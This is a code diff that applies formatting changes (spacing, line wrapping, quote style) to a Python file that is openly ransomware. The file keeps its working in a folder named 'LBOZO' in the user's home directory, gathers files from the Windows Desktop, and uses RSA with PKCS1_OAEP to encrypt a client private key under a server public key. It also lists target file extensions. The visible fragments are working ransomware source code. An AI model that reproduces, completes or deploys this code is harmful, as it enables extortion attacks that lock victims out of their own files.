@@ -8,7 +8,7 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 import base64
-import Crypto.Random 
+import Crypto.Random
 
 global keypath
 keypath = "./keys/"
@@ -21,6 +21,7 @@ ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.1234567890"
 
 maxWorker = 100
 
+
 def get_files(os_type):
     if os_type == "Windows":
         desktop = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
@@ -29,8 +30,10 @@ def get_files(os_type):
 def encrypt_keyfile(Client_private_key, server_public_key):
     encrypt_key = RSA.import_key(server_public_key)
     cipher_rsa = PKCS1_OAEP.new(encrypt_key)
-    n = 16 # chunk length
-    chunks = [Client_private_key[i:i+n] for i in range(0, len(Client_private_key), n)]
+    n = 16  # chunk length
+    chunks = [
+        Client_private_key[i : i + n] for i in range(0, len(Client_private_key), n)
+    ]
     final_encrypted = b""
     for i in chunks:
         encrypted_content = cipher_rsa.encrypt(i)
@@ -210,7 +213,7 @@ def generate_keys():
 
 def encrypt_priv_key(msg, key):
     n = 127
-    x = [msg[i:i+n] for i in range(0, len(msg), n)]
+    x = [msg[i : i + n] for i in range(0, len(msg), n)]
 
     key = RSA.importKey(key)
     cipher = PKCS1_OAEP.new(key)
@@ -235,7 +238,9 @@ ransomware_path = os.path.expanduser("~") + "\LBOZO"
 
 client_public_key_path = os.path.join(ransomware_path, "client_public_key.PEM")
 
-encrypted_client_private_key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
+encrypted_client_private_key_path = os.path.join(
+    ransomware_path, "encrypted_client_private_key.key"
+)
 
 fileExtensions = [
     "AAC",
